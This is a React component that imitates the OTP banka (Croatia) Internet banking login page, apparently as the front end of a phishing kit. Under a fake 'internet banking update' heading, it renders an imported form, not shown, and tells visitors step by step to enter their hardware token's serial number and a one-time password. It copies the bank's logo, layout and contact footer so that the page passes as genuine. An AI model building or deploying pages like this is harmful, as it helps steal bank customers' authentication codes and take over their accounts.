import Logo from '../assets/logo.png'
import Form from '../components/Form'

function Home() {
	return (
		<div id="app" data-v-app>
			<header id="navbar" className="navbar navbar-static-top navbar-default otp-login-header">
				<div className="header-main" bis_skin_checked={1} style={{ minHeight: "50px" }}>
					<div className="container" bis_skin_checked={1}>
						<div className="row" bis_skin_checked={1}>
							<div className="navbar-header col-sm-3" bis_skin_checked={1}>
								<a className="logo small-mobile" href="javascript:;" title="Početna">
									<img src={Logo} alt="Početna" className="img-responsive" />
								</a>
							</div>
						</div>
					</div>
				</div>
			</header>
			<div className="otp-login" bis_skin_checked={1}>
				<div className="otp-page-grey" bis_skin_checked={1}>
					<div className="container" bis_skin_checked={1}>
						<div className="row" bis_skin_checked={1}>
							<div className="col-md-12 text-center" bis_skin_checked={1}>
								<br />
								<h3>Dobrodošli u Ažuriranje Internet bankarstvo OTP banke</h3>
								<div className="col-md-12" bis_skin_checked={1}>
									<br />
								</div>
							</div>
						</div>
						<div id="app" data-v-app>
							<header id="navbar" className="navbar navbar-static-top navbar-default otp-login-header">
								<div className="header-main" bis_skin_checked={1} style={{ minHeight: "50px" }}>
									<div className="container" bis_skin_checked={1}>
										<div className="row" bis_skin_checked={1}>
											<div className="navbar-header col-sm-3" bis_skin_checked={1}>
												<a className="logo small-mobile" href="javascript:;" title="Početna">
													<img src={Logo} alt="Početna" className="img-responsive" />
												</a>
											</div>
										</div>
									</div>
								</div>
							</header>
							<div className="otp-login" bis_skin_checked={1}>
								<div className="otp-page-grey" bis_skin_checked={1}>
									<div className="container" bis_skin_checked={1}>
										<div className="row" bis_skin_checked={1}>
											<div className="col-md-12 text-center" bis_skin_checked={1}>
												<br />
												<h3>Dobrodošli u Ažuriranje Internet bankarstvo OTP banke</h3>
												<div className="col-md-12" bis_skin_checked={1}>
													<br />
												</div>
											</div>
										</div>
									</div>
								</div>
								<div className="otp-page-grey otp-subnav" bis_skin_checked={1}>
									<div className="container" bis_skin_checked={1}>
										<div className="row" bis_skin_checked={1}>
											<div className="col-md-12 col-md-offset-2" bis_skin_checked={1}>
												<ul className="nav nav-tabs list-inline">
													<li className="active">
														<a href="#" data-openframe={1}>
															<span className="hidden-xs">Internet bankarstvo</span> Token / SB Card
															<br />
															&nbsp;
														</a>
													</li>
												</ul>
											</div>
										</div>
									</div>
								</div>
								<div className="otp-frame active" data-frame={1} bis_skin_checked={1}>
                  <Form/>
									<div className="otp-page-white" bis_skin_checked={1}>
										<div className="container" bis_skin_checked={1}>
											<div className="row" bis_skin_checked={1}>
												<div className="col-md-12 text-left" bis_skin_checked={1}>
													<br />
													<h4>Uputa za ažuriranje u Internet bankarstva:</h4>
													<ol>
														<li>Uključite token pritiskom na tipku za paljenje</li>
														<li>Unesite osobni PIN</li>
														<li>Pritisnite tipku 1</li>
														<li>U polje "Serijski broj tokena" upišite serijski broj tokena koji se nalazi na poleđini tokena (broj od 8 ili 10 znamenki bez unosa crtica)</li>
														<li>U polje "Jednokratna zaporka" upišite jednokratnu zaporku duljine 6 znamenki s ekrana tokena</li>
														<li>Kliknite na tipku "Ažuriranje"</li>
													</ol>
													<h4>Uputa za ažuriranje u Internet bankarstvo pomoću SBcard-a:</h4>
													<ol>
														<li>Uključite token pritiskom na tipku za paljenje</li>
														<li>Unesite osobni PIN</li>
														<li>Pritisnite tipku OK</li>
														<li>Zaslon će prikazati poruku MODE (način rada); Pritisnite tipku 6</li>
														<li>Na zaslonu će se prikazati jednokratna šifra koju upisujete u polje "Jednokratna zaporka"</li>
														<li>U polje "Serijski broj tokena" upišite serijski broj tokena koji se nalazi na poleđini SBcard uređaja (broj od 10 znamenki)</li>
														<li>Kliknite na tipku "Ažuriranje"</li>
													</ol>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div className="footer-wrap" bis_skin_checked={1}>
								<footer className="container">
									<p className="text-center">
										Kontakt centar OTP banke e-mail: <a href="mailto:info@otpbanka.hr">info@otpbanka.hr</a> (radnim danom od 08:00 do 20:30 sat i subotom od 08:00 do 13:00 sati){" "}
									</p>
								</footer>
							</div>
						</div>
						<div className="notyf" />
						<div
							className="notyf-announcer"
							aria-atomic="true"
							aria-live="polite"
							style={{
								border: "0px",
								clip: "rect(0px, 0px, 0px, 0px)",
								height: "1px",
								margin: "-1px",
								overflow: "hidden",
								padding: "0px",
								position: "absolute",
								width: "1px",
								outline: "0px",
							}}
						/>
					</div>
				</div>
			</div>
		</div>
	);
}

export default Home;
